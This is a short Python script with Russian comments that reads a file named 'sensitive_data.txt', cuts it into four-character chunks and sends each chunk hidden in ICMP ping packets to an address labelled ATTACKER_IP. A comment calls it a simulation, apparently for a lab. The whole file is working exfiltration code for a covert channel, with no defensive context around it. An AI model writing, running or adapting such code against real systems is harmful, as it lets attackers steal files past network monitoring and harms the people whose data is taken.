import time
from scapy.all import IP, ICMP, send

ATTACKER_IP = "10.0.2.5"
FILE_TO_STEAL = "sensitive_data.txt"

def exfiltrate():
    with open(FILE_TO_STEAL, "r") as f:
        data = f.read().strip()
    
    print(f"[*] Начало эксфильтрации файла: {FILE_TO_STEAL}")
    print(f"[*] Данные для отправки: {data}")

    chunk_size = 4
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    for chunk in chunks:
        # Собираем кастомный пакет: IP-назначения + тип протокола ICMP + payload
        packet = IP(dst=ATTACKER_IP) / ICMP(type=8) / chunk
        
        print(f"[+] Отправка пакета с куском данных: {chunk}")
        send(packet, verbose=False)
        
        # Небольшая задержка, чтобы пакеты не слиплись и симуляция выглядела естественно
        time.sleep(1)

    print("[*] Эксфильтрация завершена!")

if __name__ == "__main__":
    exfiltrate()
